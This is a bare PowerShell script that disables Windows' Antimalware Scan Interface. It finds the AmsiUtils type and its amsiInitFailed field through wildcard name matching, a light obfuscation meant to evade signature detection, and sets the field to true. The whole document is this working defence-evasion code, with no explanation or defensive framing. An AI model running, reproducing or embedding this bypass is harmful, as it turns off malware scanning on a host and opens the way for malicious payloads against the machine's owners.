$a = [Ref].Assembly.GetTypes()
Foreach($b in $a) {
    if($b.Name -like "Am*Ut*") {
        $c = $b
    }
}
$d = $c.GetFields("NonPublic, Static")
Foreach($e in $d) {
    if($e.Name -like "Am*In*Fa*") {
        $f = $e
    }
}
$f.SetValue($null, $true)